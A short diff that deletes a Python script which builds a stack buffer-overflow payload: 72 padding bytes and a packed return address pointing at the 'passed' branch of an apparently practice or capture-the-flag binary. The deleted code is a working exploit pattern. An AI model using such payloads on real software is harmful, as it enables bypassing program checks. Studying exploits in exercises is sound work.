@@ -1,7 +1,0 @@
-import struct
-
-win_addr = 0x10652  # address of the "passed" branch in main
-payload = b'A' * 72 + struct.pack('<Q', win_addr)
-
-with open('payload', 'wb') as f:
-    f.write(payload)
